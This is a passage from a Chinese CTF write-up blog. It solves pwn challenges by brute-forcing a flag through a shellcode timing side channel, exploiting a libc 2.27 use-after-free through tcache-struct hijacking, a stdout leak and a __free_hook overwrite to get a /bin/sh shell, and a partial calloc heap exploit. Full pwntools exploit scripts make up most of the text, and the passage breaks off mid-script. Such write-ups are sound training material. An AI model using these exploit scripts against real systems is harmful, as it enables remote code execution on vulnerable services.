class="hljs-number">0</span>, <span class="hljs-number">0x10015</span>, <span class="hljs-number">0x100</span>)))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/15/qpMYn9IEgTLd7Qx.png"></p><p><strong>侧信道爆破flag</strong></p><p>肯定是要先打开文件然后才能读内容，所以第一部分shellcode肯定是open系统调用</p><p><img src="https://i.loli.net/2021/10/15/UEatVAPLkCnGNOd.png"></p><p>那现在就是读呗，方便起见就把flag读到栈上好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">orw_payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdx, 0x100</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/15/eXWc7iN9r1osQVU.png"></p><p><img src="https://i.loli.net/2021/10/15/pYr7zMVyWGh1eg9.png"></p><p>下面部分就是重点了，read的第二个参数是rsi也就是存放了flag的地址，<code>mov    al, byte ptr [rsi]</code>可以将flag的第一位放到al中，接着<code>cmp    al, 0x3f</code>，如果flag的值大于0x3f就让程序跳转到比较的代码块中，也就是形成了一个死循环，下图是gdb调试的实例。设定一个超时异常处理就可以捕捉到这种死循环，接着下一个判断的就拿(0x3f+1+127)//2去跟flag的值做判断，了解过数据结构的二分查找就很容易理解，不多赘述了。一分多钟flag就跑出来了。</p><p><img src="https://i.loli.net/2021/10/15/3rPce54pMw9DZ7Y.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">orw_payload += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               mov rdi, rax</span><br><span class="hljs-string">               xor rax, rax</span><br><span class="hljs-string">               mov rsi, rsp</span><br><span class="hljs-string">               mov rdx, 0x100</span><br><span class="hljs-string">               syscall</span><br><span class="hljs-string">               loop:</span><br><span class="hljs-string">               mov al, [rsi + %d]</span><br><span class="hljs-string">               cmp al, %d</span><br><span class="hljs-string">               ja loop</span><br><span class="hljs-string">               mov [rax], rax</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span> % (i, mid)<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>binary = <span class="hljs-string">&#x27;./chall&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>):<br>    l = <span class="hljs-number">0</span><br>    r = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> l &lt; r:<br>        mid = (l + r) &gt;&gt; <span class="hljs-number">1</span><br>        local = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>        <span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">24002</span>)<br>        <span class="hljs-comment"># gdb.attach(p)</span><br>        <br>        orw_payload = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>        orw_payload += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               mov rdi, rax</span><br><span class="hljs-string">               xor rax, rax</span><br><span class="hljs-string">               mov rsi, rsp</span><br><span class="hljs-string">               mov rdx, 0x100</span><br><span class="hljs-string">               syscall</span><br><span class="hljs-string">               loop:</span><br><span class="hljs-string">               mov al, [rsi + %d]</span><br><span class="hljs-string">               cmp al, %d</span><br><span class="hljs-string">               ja loop</span><br><span class="hljs-string">               mov [rax], rax</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span> % (i, mid)<br>        p.send(asm(shellcraft.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x10015</span>, <span class="hljs-number">0x100</span>)))<br>        p.send(asm(orw_payload))<br>        st = time.time()<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                cur = p.recv(timeout=<span class="hljs-number">0.05</span>)<br>                <span class="hljs-keyword">if</span> time.time() - st &gt; <span class="hljs-number">1</span>:<br>                    l = mid + <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> EOFError:<br>            r = mid<br>        p.close()<br>    flag += <span class="hljs-built_in">chr</span>(l)<br>    <span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><h2 id="superchunk"><a href="#superchunk" class="headerlink" title="superchunk"></a>superchunk</h2><p>脸黑，爆了我半个多小时才出，侥幸一血</p><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序分析起来几乎没有任何压力，libc2.27的uaf，没有show（io_stdout来泄露libc），只能操作当前堆块（劫持tcache struct），和今年国赛的lonelywolf十分相似。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>先劫持tcache struct，没有show函数就没法泄露堆地址了，程序开了PIE，可以爆破4个比特，1/16的概率。</p><p>堆块布局如下，把chunk0-&gt;fd的低两位字节覆盖掉，2个字节就是4个16进制数，低3位是固定的，还有一个是随机的，需要爆破。</p><p><img src="https://i.loli.net/2021/10/15/oFVbaWzYnjuI4Uk.png"></p><p>拿到tcache的控制堆块就可以为所欲为了，随便改了，后续操作就是泄露libc，打free_hook。</p><p>当然堆风水也需要慢慢调，下面简述一下劫持后的操作</p><p>让tcache struct放进unsorted bin里进行切割，切割后会留下unsorted bin的地址，然后再edit低两位字节，因为io_stdout的低3个16进制是固定的，需要爆破一个16进制数，概率1/16，再把stdout申请下来改成<code>p64(0xfbad3887)+p64(0)*3 + p8(0)</code>就可以泄露libc了。再后面就tcache attack了。</p><h3 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h3><p>调试过程关闭本机的地址随机化，命令：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><strong>劫持tcache struct</strong></p><p>让tcache链表中有两个chunk，那么其中fd就会指向一个堆地址，这里我是用了double free。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/h9Lsqp61Ju8BWQK.png"></p><p>再把chunk0的fd改成指向tcache struct，这样就劫持成功了，申请两次就能控制它了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(p16(<span class="hljs-number">0x3010</span>))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/C2ocepUBVzX7K5k.png"></p><p><strong>libc泄露</strong></p><p>我们来逆向思考一下，没有show函数要泄露libc基本就是通过打io_stdout，要把它申请到那么它肯定得在bin里面，最常见的就是tcache bin和unsorted bin，unsorted bin是个双链表不好操作，但他的地址又是个libc中的地址，跟io_stdout十分接近。那么我们就可以构造一种情形，同样大小的一个chunk即在unsorted bin里又在tcache bin里，那么只要同样的操作把低两位字节改成io_stdout的地址是不是就把io_stdout链到tcache bin里了。</p><p>操作如下，接着劫持tcache_struct那部分，通过修改tcache_struct把0x250大小的tcache bin的数量改成6，那么再free tcache_struct，他就会进入tcache bin，并且对应的数量为7，再free一次它又进入了unsorted bin。即同一堆块即在tcache bin中又在unsorted bin中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x23</span> + <span class="hljs-string">&#x27;\x06&#x27;</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/jrY3GTwpm2fyk5S.png"></p><p>接着再切割一下，是不是就有很多unsorted bin的地址链到tcache bin里了，不过多解释，需要清楚tcache每部分的含义(不知道那你劫持它干啥)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#备胎</span><br>free()<br>add(<span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/SXbVv1HTeuYpgjm.png"></p><p>再申请一个chunk进行编辑，可以发现正好是改的0xc0的tcache bin的fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>edit(p16(<span class="hljs-number">0xe760</span>))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/OwiVyaFCpW5hm8t.png"></p><p>那把它申请下来不就好了，libc到手，美滋滋</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xb0</span>)<br>edit(p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/YoyJiPw7hE563uW.png"></p><p>后面就简单了，把<strong>备胎</strong>堆块申请下来，接着改tcache_struct，把free_hook链上去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-string">&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x3f</span> + p64(free_hook))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/Uu8rkhSeKaxnD74.png"></p><p>最后就一把梭了，不放图了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p><strong>本地调试版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary = <span class="hljs-string">&#x27;./superchunk&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">26744</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>elf = ELF(binary)<br><span class="hljs-comment"># libc = elf.libc</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br>gdb.attach(p)<br>add(<span class="hljs-number">0x100</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>edit(p16(<span class="hljs-number">0x3010</span>))<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x23</span> + <span class="hljs-string">&#x27;\x06&#x27;</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>add(<span class="hljs-number">0x80</span>)<br><br>free()<br><br>add(<span class="hljs-number">0x100</span>)<br>edit(p16(<span class="hljs-number">0xe760</span>))<br><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0xb0</span>)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>edit(p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><span class="hljs-comment"># pause()</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-string">&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x3f</span> + p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(system))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free()<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>远程爆破版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./superchunk&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>add(<span class="hljs-number">0x100</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>edit(p16(<span class="hljs-number">0x3010</span>))<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x23</span> + <span class="hljs-string">&#x27;\x06&#x27;</span>)<br>free()<br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free()<br>add(<span class="hljs-number">0x80</span>)<br><br>free()<br><br>add(<span class="hljs-number">0x100</span>)<br><br>edit(p16(<span class="hljs-number">0xe760</span>))<br><span class="hljs-comment"># free()</span><br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0xb0</span>)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># gdb.attach(p)</span><br>edit(p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ed8b0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><span class="hljs-comment"># pause()</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-string">&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x3f</span> + p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(system))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free()<br>p.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            local = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> local:<br>            <span class="hljs-comment"># p = process(binary)</span><br>                p = process([binary],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>&#125;)<br>                libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>                <span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>            <span class="hljs-keyword">else</span>:<br>                p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">26118</span>)<br>                libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br>            exp()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br></code></pre></td></tr></table></figure><h2 id="loveheap"><a href="#loveheap" class="headerlink" title="loveheap"></a>loveheap</h2><p>由于是calloc，所以比赛时候的思路是tcache stashing unlink attack，改global_max_fast，然后打fastbin attack，改malloc_hook为one_gadget。one_gadget试遍了，realloc调栈也试了，没出，可太难受了。</p><p>不知道这题的正解是什么，先把我的exp放出来，如果有师傅看到，希望可以指点一下(WeChat ID is verf1sh)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./loveheap&#x27;</span><br>elf = ELF(binary)<br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(binary)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;106.14.120.231&#x27;</span>, <span class="hljs-number">25777</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;content:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br>add(<span class="hljs-number">0x100</span>)  <span 